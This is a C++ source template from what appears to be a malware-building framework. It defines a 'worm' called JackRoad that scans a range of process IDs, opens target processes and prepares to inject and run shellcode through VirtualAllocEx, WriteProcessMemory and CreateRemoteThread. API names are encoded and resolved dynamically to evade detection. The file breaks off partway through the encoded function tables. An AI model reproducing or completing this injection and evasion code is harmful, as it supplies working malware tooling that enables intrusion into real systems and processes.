#!name##JackRoad
#!types##worm
#!info##A worm written in C++ designed for testing shellcode. It scans processes within a specified PID range, locates a vulnerable target, injects, and executes the shellcode. It does not use the windows.h header; instead, all functions are imported dynamically through a custom library. The worm displays detailed information about the target process, allocated memory, and other relevant injection data.
#!lang##cpp
#!system_FLAG##[W]
#!globalVar##COMPILER##mingw-x64-cpp##The name of the compiler to build the executable file.
#!globalVar##NO_DLL##True##No debug symbols etc.
#!banned##module##starter##shadow##junk
#!processWorm##WormLib
#!reqSMod##DuckTales
#!include##SC_Storage_cpp##sc_storage.cpp
#!reqVar##JR_start##Start PID process##int
#!setVar##JR_start##2000##int
#!reqVar##JR_last##Last PID process##int
#!setVar##JR_last##8000##int





#include <iostream>
#include <cstddef>
#include <vector>
#include "sc_storage.h"

#define PROCESS_ALL_ACCESS 0x1F0FFF
#define FALSE 0
#define MEM_COMMIT_RESERVE 0x00003000
#define PAGE_EXECUTE_READWRITE 0x40


typedef unsigned int u32; // uint32_t
typedef int BOOL;    // BOOL
typedef void* HANDLE; // HANDLE
typedef unsigned int DWORD;     // DWORD
typedef void* LPVOID;   // LPVOID


// Function pointer - prefix 'wp'
typedef void (__stdcall* wpSleep)(unsigned int);
typedef HANDLE (__stdcall* wpOpenProcess)(DWORD, BOOL, DWORD);
typedef DWORD (__stdcall* wpGetLastError)();
typedef LPVOID (__stdcall* wpVirtualAllocEx)(HANDLE, LPVOID, size_t, DWORD, DWORD);
typedef BOOL (__stdcall* wpWriteProcessMemory)(HANDLE, LPVOID, const void*, size_t, size_t*);
typedef HANDLE (__stdcall* wpCreateRemoteThread)(HANDLE, void*, size_t, unsigned int (__stdcall*)(void*), LPVOID, DWORD, unsigned int*);

//DuckTales functions
extern "C" void DuckStartTales();
extern "C" const char* DuckIntro();
extern "C" void* DuckGetAddr(const char* name);
extern "C" void* DuckGet(u32* fname, u32* dll_name);
extern "C" void* DuckShow(u32* text);


{% set DUCK_TBASE = TOOL.AsmSh_make_table(data=DT_text, set_as_default=True) %}

class JackRoad
{
    private:
        //encoded functions name. Prefix: 'en_'
        u32 en_Sleep[20] = {
            {{TOOL.AsmSh_encode("Sleep")}}
            }; // Sleep
        u32 en_GetLastError[20] = {
            {{TOOL.AsmSh_encode("GetLastError")}}
        }; // GetLastError
        u32 en_OpenProcess[20] = {
